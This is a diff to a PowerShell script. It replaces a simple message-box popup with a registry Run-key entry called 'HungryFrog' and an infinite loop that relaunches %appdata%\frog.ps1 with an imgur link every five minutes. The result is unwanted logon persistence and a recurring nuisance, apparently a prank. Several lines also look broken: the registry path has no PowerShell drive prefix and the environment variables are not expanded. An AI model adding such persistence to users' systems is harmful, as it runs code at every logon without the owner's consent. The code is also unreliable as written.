@@ -1,7 +1,7 @@
-Add-Type -AssemblyName PresentationCore,PresentationFramework
+Set-ItemProperty -Path "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run" -name "HungryFrog" -Value "%appdata%\\frog.ps1"
 
-$msgBody = "blabla is blabla"
-$msgTitle = "Question!"
-$msgButton = 'YesNoCancel'
-$msgImage = 'Question'
-$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+while(1 -eq 1)
+{
+  Start-Process -FilePath "%appdata%\\frog.ps1" -ArgumentList "https://imgur.com/RS2OVJf";
+  Start-Sleep -s 300;
+}
